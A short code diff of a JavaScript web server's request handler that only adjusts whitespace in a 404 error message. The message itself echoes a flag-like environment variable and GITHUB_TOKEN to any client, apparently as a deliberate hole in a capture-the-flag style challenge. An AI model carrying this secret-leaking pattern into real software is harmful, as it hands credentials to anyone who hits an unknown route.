@@ -38,7 +38,7 @@ const requestHandler = (req, res) => {
     }
   } else {
     res.writeHead(404);
-    res.end(JSON.stringify({ error: `Server   secret is : ${process.env.FLAG_GRAVY_OVERFLOW_L0_GRAVY} Server secret is: ${process.env.GITHUB_TOKEN}` }));
+    res.end(JSON.stringify({ error: `Server    secret is : ${process.env.FLAG_GRAVY_OVERFLOW_L0_GRAVY} Server secret is: ${process.env.GITHUB_TOKEN}` }));
   }
 };
 
